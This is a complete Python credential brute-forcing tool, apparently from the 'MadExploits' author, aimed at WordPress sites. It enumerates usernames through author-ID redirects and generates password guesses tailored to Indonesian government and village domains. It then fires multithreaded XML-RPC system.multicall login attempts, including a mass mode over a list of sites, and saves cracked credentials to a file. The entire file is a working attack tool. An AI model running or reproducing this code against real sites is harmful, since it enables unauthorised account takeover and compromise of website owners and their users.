#!/usr/bin/python3

from colorama import Fore, Back, Style
from os import name, system
from tqdm import tqdm
import requests
import random
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XMLRPCBRUTEFORCE:
    def __init__(self, url):
        self.file_pass = "/usr/share/wordlists/pass.txt"
        self.website = url
        self.username = []
        self.password = []

        self.useragents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
        ]

        self.header = {
            "User-Agent": random.choice(self.useragents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }

    def clean_ssl(self, domain):
        if domain.startswith("https://"):
            return domain.replace("https://", "")
        elif domain.startswith("http://"):
            return domain.replace("http://", "")

    def get_username_from_author_id(self, site_url):
        try:
            for i in range(1, 10):
                api_url = f"{site_url}/?author={i}"
                with requests.Session() as session:
                    response = session.get(api_url, allow_redirects=True, timeout=10)
                    if "?author=" not in response.url:
                        username = str(response.url).split("/author/")[-1].strip("/")
                        self.username.append(username)
                    else:
                        break
        except:
            pass

    def extract_domain_without_tld(self, domain):
        return domain.split(".")[0] if "." in domain else domain

    def warna(self, text, warna):
        if warna == "merah":
            return Fore.WHITE + Back.RED + text + Style.RESET_ALL
        elif warna == "hijau":
            return Fore.WHITE + Back.GREEN + text + Style.RESET_ALL
        elif warna == "kuning":
            return Fore.WHITE + Back.YELLOW + text + Style.RESET_ALL
        elif warna == "biru":
            return Fore.WHITE + Back.BLUE + text + Style.RESET_ALL

    def generate_passwords(self, username, domain):
        domain = self.clean_ssl(domain)
        clean_domain = self.extract_domain_without_tld(domain)
        base_passwords = [username, clean_domain, f"{username}{clean_domain}", f"{clean_domain}{username}"]

        variations = set()

        for pwd in base_passwords:
            variations.add(pwd)
            variations.add(pwd + "123")
            variations.add(pwd + "!")
            variations.add(pwd.capitalize())
            variations.add(pwd.replace("o", "0").replace("a", "@"))
            variations.add(pwd[::-1])
            variations.add(pwd.replace("a", "4").replace("e", "3").replace("i", "1").replace("o", "0").replace("s", "5"))
            variations.add(pwd + "@2012")
            variations.add(pwd + "@2013")
            variations.add(pwd + "@2017")
            variations.add(pwd + "@2018")
            variations.add(pwd + "@2010")
            variations.add(pwd + "@2024")
            variations.add(pwd + "!#2012")
            variations.add(pwd + "!2012")
            variations.add(pwd + "!@")
            variations.add(pwd + "!@2012")
            variations.add(pwd + "!@2013")
            variations.add(pwd + "!@2017")
            variations.add(pwd + "!@2018")
            variations.add(pwd + "!@2010")
            variations.add(pwd + "!@2024")
            variations.add(pwd + "!#2012")
            variations.add(pwd + "jaya")
            variations.add(pwd + "jaya2012")
            variations.add(pwd + "jaya2013")
            variations.add(pwd + "indonesia")
            variations.add(pwd + "indonesia2012")
            variations.add(pwd + "cinta")
            variations.add(clean_domain.capitalize())
            variations.add(clean_domain.lower())
            variations.add(clean_domain.upper())
            variations.add(clean_domain.capitalize() + "2012")
            variations.add(clean_domain.lower() + "2012")
            variations.add(clean_domain.upper() + "2012")
            variations.add(clean_domain.capitalize() + "2013")
            variations.add(clean_domain.lower() + "2013")
            variations.add(clean_domain.upper() + "2013")
            variations.add(clean_domain.capitalize() + "2017")
            variations.add(clean_domain.lower() + "2017")
            variations.add(clean_domain.upper() + "2017")
            variations.add(clean_domain.capitalize() + "2018")
            variations.add(clean_domain.lower() + "2018")
            variations.add(clean_domain.upper() + "2018")
            variations.add(clean_domain.capitalize() + "2019")
            variations.add(clean_domain.lower() + "2019")
            variations.add(clean_domain.upper() + "2019")
            variations.add(clean_domain.capitalize() + "2020")
            variations.add(clean_domain.lower() + "2020")
            variations.add(clean_domain + pwd)
            variations.add(clean_domain + pwd.upper())
            variations.add(clean_domain + pwd.capitalize())
            variations.add(clean_domain + pwd.lower())
            variations.add(clean_domain + pwd.title())
            variations.add(clean_domain + pwd.swapcase())
            variations.add(clean_domain + pwd[::-1])
            variations.add(clean_domain + pwd[::-1].upper())
            variations.add(clean_domain + pwd[::-1].capitalize())
            variations.add(clean_domain + pwd[::-1].lower())
            variations.add("kominfo")
            variations.add("kominfo2018")
            variations.add("kominfo2019")
            variations.add("kominfo2020")
            variations.add("kominfo" + pwd)
            variations.add("kominfo" + pwd.upper())
            variations.add("kominfo" + pwd.capitalize())
            variations.add("kominfo" + pwd.lower())
            variations.add("kominfo" + pwd.title())
            variations.add("dishub")
            variations.add("dishub2018")
            variations.add("dishub2019")
            variations.add("dishub2020")
            variations.add("dishub" + pwd)
            variations.add("dishub" + pwd.upper())
            variations.add("dishub" + pwd.capitalize())
            variations.add("dishub" + pwd.lower())
            variations.add("dishub" + pwd.title())
            variations.add("desa"+ clean_domain)
            variations.add("desa" + pwd)
            variations.add("desa" + pwd.upper())
            variations.add("desa" + pwd.capitalize())
            variations.add("desa" + pwd.lower())
            variations.add("desa" + pwd.title())
            variations.add("desa" + clean_domain.upper())
            variations.add("desa" + clean_domain.capitalize())
            variations.add("desa" + clean_domain.lower())
            variations.add("desa" + clean_domain.title())
            variations.add("desa" + clean_domain.replace(".", ""))
            variations.add("desa" + clean_domain.replace(".", "").upper())
            variations.add("ganteng")
            variations.add("123456")
            variations.add("123456789")
            variations.add("12345678")
            variations.add("tanggallahir")
                           

        with open(self.file_pass, "r") as r:
            read = r.read()
            for pwd in read.split("\n"):
                if pwd == "":
                    continue
                variations.add(pwd)

        self.password.append(list(variations))

    def attempt_login(self, username, password):
        data = f"""
            <?xml version="1.0"?>
            <methodCall>
            <methodName>system.multicall</methodName>
            <params>
            <param><value><array><data>
            <value><struct>
            <member>
                <name>methodName</name>
                <value><string>wp.getUsersBlogs</string></value>
            </member>
            <member>
                <name>params</name><value><array><data>
                <value><array><data>
                <value><string>{username}</string></value>
                <value><string>{password}</string></value>
                </data></array></value>
                </data></array></value>
            </member>
            </struct></value>
            </data></array></value>
            </param>
            </params>
            </methodCall>
        """

        try:
            with requests.Session() as session:
                response = session.post(f"{self.website}/xmlrpc.php", data=data, headers=self.header, timeout=10, verify=False)
                if response.status_code == 200 and "isAdmin" in response.text:
                    return "SUCCESS"
                else:
                    pass
        except:
            pass

    def check_wp(self):
        try:
            r = requests.get(f"{self.website}/wp-login.php", timeout=10, verify=False, headers=self.header)
            if "wp-login.php" in r.text and r.status_code == 200:
                return True
        except:
            return False

    def xmlrpc_brute_force(self):
        self.get_username_from_author_id(self.website)
        if self.username:
            print(f"{self.warna("[@]", "biru")} Found Username, & Total Username : {len(self.username)}")
        else:
            print(f"{self.warna("[!]", "merah")} Username Not Found Or Error Fetching URL : {self.website} {self.warna('[SKIPPING THIS TARGET!]', 'merah')}")

        for username in self.username:
            self.generate_passwords(username, self.website)

        for username in self.username:
            password_len = len(self.password[-1])
            with tqdm(total=password_len, desc=f"{self.warna("[@]", 'merah')} Bruteforcing.. ", unit="passwords", colour="green", ascii="--=>") as pbar: 
                with ThreadPoolExecutor(max_workers=170) as executor:
                    futures = {executor.submit(self.attempt_login, username, password): password for password in self.password[-1]}
                    for future in as_completed(futures):
                        password = futures[future]
                        result = future.result()
                        pbar.set_description(f"{self.warna("[Run]", "hijau")} Bruteforcing.. [ {username} ] => {Fore.GREEN + password + Style.RESET_ALL} ")
                        pbar.update(1)
                        if result == "SUCCESS":
                            pbar.update(100)
                            pbar.close()
                            print(f"\n{self.warna("[SUCCESS]", "hijau")} {self.website} => {username} : {password}\n")
                            with open("wpxmlrpcbf.txt", "a") as f:
                                f.write(f"{self.website} => {username}:{password}\n")
                            executor.shutdown(wait=False)
                            return
                        elif pbar.n >= pbar.total:
                            pbar.close()
                            print(f"{self.warna('[!]', 'merah')} Password not found on {self.website} [{self.warna("SKIP", 'merah')}]\n")
                            executor.shutdown(wait=False)
                            

    def main(self):
        if self.check_wp() == False:
            print(f"{self.warna('[!]', 'merah')} NOT A WORDPRESS {self.website} [{self.warna("SKIP", 'merah')}]")
            return
        elif self.check_wp() == True:
            print("\n")
            print(f"{self.warna('[@]', 'biru')} {self.website} => Running on this target!.")
            self.xmlrpc_brute_force()
            print("\n")

def process_target(queue):
    while not queue.empty():
        website = queue.get()
        run = XMLRPCBRUTEFORCE(website)
        run.main()
        queue.task_done()

if __name__ == "__main__":
    if name == "nt":
        system("cls")
    else:
        system("clear")

    print(Fore.GREEN + f"""
        ___________
        < XMLRPC-BF >
        -----------
        \
        ¯\_(ツ)_/¯
          
    [@] Created by : https://github.com/MadExploits
    [@] Version    : 1.0
    [@] Coded with : Python 3.8
    [@] Contact    : https://t.me/MadExploits
    [@] Github     : https://github.com/MadExploits

""" + Style.RESET_ALL)
    
    choose = input("[?] Choose a [1/2] Single or Mass : ")
    if choose == "1":
        website = input("[?] Website : ")
        print("\n")
        run = XMLRPCBRUTEFORCE(website)
        run.main()
    elif choose == "2":
        try:
            list_web = input(f"[*] LIST : ")
            print("\n")
            queue = Queue()
            with open(list_web, "r") as f:
                for website in f:
                    url = website.strip()
                    queue.put(url)

            threads = []
            for _ in range(170):  # Adjust the number of threads as needed
                thread = threading.Thread(target=process_target, args=(queue,))
                thread.start()
                threads.append(thread)

            for thread in threads:
                thread.join()

        except Exception as e:
            print(f"[!] Error : {e}")
    else:
        print("[!] Wrong input")
